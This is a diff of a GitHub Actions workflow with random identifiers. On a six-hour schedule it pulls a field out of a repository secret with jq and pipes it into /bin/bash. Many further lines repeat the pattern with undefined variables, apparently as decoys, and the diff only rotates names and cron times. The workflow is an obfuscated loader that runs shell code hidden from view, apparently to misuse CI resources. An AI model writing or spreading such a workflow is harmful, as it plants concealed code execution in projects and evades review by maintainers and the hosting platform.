@@ -1,30 +1,36 @@
 name: yunchengzhu6758
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 0/6 * * *'
-jobs:  # 29980
+    - cron: '38 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yunchengzhu6758
         env:
-          vgo149: ${{ secrets.vgo149 }}
+          lwpq46: ${{ secrets.lwpq46 }}
         run: |
-          echo $vgo149 | jq -r .ugbrr1602 | /bin/bash
-          echo $drjuf9925 | jq -r .rmzsx8034 | /bin/bash
-          echo $bvj6189 | jq -r .ru73 | /bin/bash
-          echo $bts6735 | jq -r .le31 | /bin/bash
-          echo $npklb8238 | jq -r .git955 | /bin/bash
-          echo $jqvkz60772 | jq -r .obr080 | /bin/bash
-          echo $csg8 | jq -r .ikal31 | /bin/bash
-          echo $d387 | jq -r .fv74 | /bin/bash
-          echo $vf8820 | jq -r .ieo215 | /bin/bash
-          echo $om204 | jq -r .fpg6 | /bin/bash
-          echo $ejws26471 | jq -r .mqnw27633 | /bin/bash
-          echo $dslk481 | jq -r .d3 | /bin/bash
-          echo $pnoir46 | jq -r .ihz964 | /bin/bash
-          echo $qmhyy862 | jq -r .ie0607 | /bin/bash
-          echo $wpz58 | jq -r .nya7095 | /bin/bash
+          echo $lwpq46 | jq -r .otk1900 | /bin/bash
+          echo $yxq0 | jq -r .pf291 | /bin/bash
+          echo $ucngz936 | jq -r .gld404 | /bin/bash
+          echo $xfn0 | jq -r .vunea2 | /bin/bash
+          echo $ircq02 | jq -r .dvqtb9607 | /bin/bash
+          echo $u4721 | jq -r .bc63975 | /bin/bash
+          echo $d10641 | jq -r .p57811 | /bin/bash
+          echo $qezzg38 | jq -r .xd295 | /bin/bash
+          echo $rzf06437 | jq -r .gi042 | /bin/bash
+          echo $e0329 | jq -r .craz88 | /bin/bash
+          echo $nu987 | jq -r .tse76 | /bin/bash
+          echo $a6019 | jq -r .kl0 | /bin/bash
+          echo $q419 | jq -r .yyo49732 | /bin/bash
+          echo $fil9043 | jq -r .aha60362 | /bin/bash
+          echo $m80071 | jq -r .pxlvy0694 | /bin/bash
+          echo $golpk52 | jq -r .fcj9201 | /bin/bash
+          echo $xpygd16760 | jq -r .mtc24287 | /bin/bash
+          echo $fhry25 | jq -r .kreaa8 | /bin/bash
+          echo $tw493 | jq -r .ji761 | /bin/bash
 
